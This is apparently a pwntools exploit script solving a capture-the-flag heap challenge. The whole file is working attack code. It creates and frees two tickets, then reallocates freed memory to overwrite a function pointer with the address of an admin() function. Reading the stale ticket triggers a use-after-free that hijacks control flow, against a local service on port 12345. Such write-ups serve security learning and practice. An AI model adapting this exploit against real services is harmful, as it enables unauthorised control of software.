from pwn import *

elf = context.binary = ELF("./chall")

p = remote("localhost", 12345)

target = p64(0x401870) # `admin()` function address

def login():
    p.recvline()
    p.sendline(b'a')
    p.recv(timeout=1)
    p.sendline(b'a')
    p.recv(timeout=1)


def choice(c):
    p.sendline()
    a = p.recvuntil(b"Exit")
    p.sendline(c) 

def create(title, size, content):
    choice(b'3')
    p.sendline(title)
    p.sendline(size)
    p.sendline(content)

def delete(index):
    choice(b'4')
    p.sendline(index)


login()
# Create the first ticket with a content size = 80
create(b'title', b'80', b'test') 
# Create the second ticket with a content size = 80
create(b'title', b'80', b'test')

# Delete the first ticket
delete(b'0')
# Delete the second ticket
delete(b'0')

# Create a third ticket with a size = sizeof(ticket) 
create(b'exploit', b'50', target) 

# read the second ticket
choice(b'2')
p.sendline(b'2')

p.interactive()
p.close()